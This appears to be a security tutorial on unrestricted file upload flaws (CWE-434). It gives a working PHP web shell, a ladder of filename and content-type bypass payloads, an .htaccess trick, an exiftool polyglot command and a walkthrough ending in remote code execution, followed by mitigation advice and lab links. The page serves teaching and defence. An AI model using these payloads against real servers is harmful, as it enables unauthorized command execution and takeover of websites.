# What is Unrestricted File Upload?

Unrestricted File Upload is when an app accepts a file without properly checking its type, content, or where it lands - and then serves or executes it. The worst case is uploading a web shell and getting remote code execution. Even without RCE, weak upload handling leads to stored XSS, SSRF (via SVG/XML), and denial of service.

## How it works

- The app trusts the file extension or the client-supplied `Content-Type`
- It stores the file inside the web root with a predictable name
- Requesting the uploaded file makes the server **execute** it

## Impact

- **Remote code execution** (upload a web shell)
- Stored XSS (upload HTML/SVG)
- SSRF / XXE (upload SVG or XML)
- Overwrite critical files, denial of service (huge files / zip bombs)

## The payload - a web shell

```php
// shell.php - minimal PHP web shell (authorized testing only)
<?php system($_GET['cmd']); ?>
```

Once uploaded and reachable, run commands via `https://site.tld/uploads/shell.php?cmd=id`.

## Step-by-step bypass ladder

Try each in order; move to the next when blocked.

```text
# 1. Straight upload
shell.php

# 2. Alternate executable extensions (server still runs them as PHP)
shell.phtml  shell.php3  shell.php4  shell.php5  shell.php7  shell.phar  shell.pht

# 3. Case variation (case-sensitive blocklist)
shell.pHp  shell.PHP

# 4. Double extension (only last checked, or Apache runs first known)
shell.php.jpg
shell.jpg.php

# 5. Trailing chars that the OS strips
shell.php.       shell.php%20     shell.php...     shell.php::$DATA (Windows)

# 6. Null byte (legacy PHP/other stacks)
shell.php%00.jpg

# 7. Content-Type spoof: keep name shell.php but set header
Content-Type: image/png

# 8. Magic bytes so content sniffing passes (put PHP after)
GIF89a;<?php system($_GET['cmd']); ?>

# 9. Path traversal in the filename to escape the upload dir
filename="../../shell.php"
```

**.htaccess trick** (when only images allowed but Apache serves the dir):

```apache
# Upload this as .htaccess to make .jpg run as PHP, then upload shell.jpg
AddType application/x-httpd-php .jpg
```

**Polyglot image+PHP** (passes image validation, still executes):

```bash
# Append PHP to a real image
cp real.jpg shell.php.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.php.jpg
```

## Full walkthrough

1. Upload `cat.jpg`, observe it served at `/uploads/cat.jpg`.
2. Try `shell.php` -> rejected ("only images").
3. Try `shell.php.jpg` with `Content-Type: image/jpeg` and `GIF89a` header -> accepted.
4. Server config runs `.jpg`? No. Upload `.htaccess` to force it -> accepted.
5. Browse `/uploads/shell.php.jpg?cmd=id` -> command runs. RCE.

## Tools

- [Burp Suite](https://portswigger.net/burp) - tamper filename, Content-Type, and magic bytes
- [Upload_Bypass](https://github.com/sAjibuu/Upload_Bypass) - automated upload filter bypass
- [ffuf](https://github.com/ffuf/ffuf) - brute-force the upload directory to find your file
- [fuxploider](https://github.com/almandin/fuxploider) - upload vuln scanner

## Mitigation - the fix

- **Allowlist** extensions AND verify real content (magic bytes / re-encode images).
- **Rename** files to random values; strip the original extension.
- Store uploads **outside the web root** or on a separate non-executing domain/bucket.
- Disable script execution in the upload directory (`php_admin_flag engine off`, no `AllowOverride`).
- Enforce size limits; scan with AV/YARA.

```python
# Example: validate extension + content, rename, store outside webroot
import imghdr, os, uuid
ALLOWED = {'jpeg', 'png', 'gif'}
if imghdr.what(file) not in ALLOWED:
    reject()
safe_name = f"{uuid.uuid4()}.{imghdr.what(file)}"
save(os.path.join('/var/app/uploads', safe_name))   # not in web root
```

## Practice

- [PortSwigger file upload labs](https://portswigger.net/web-security/file-upload)

## Deep dive

- [Unrestricted File Upload - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger file upload labs](https://portswigger.net/web-security/file-upload)

## CWE

- CWE-434: Unrestricted Upload of File with Dangerous Type
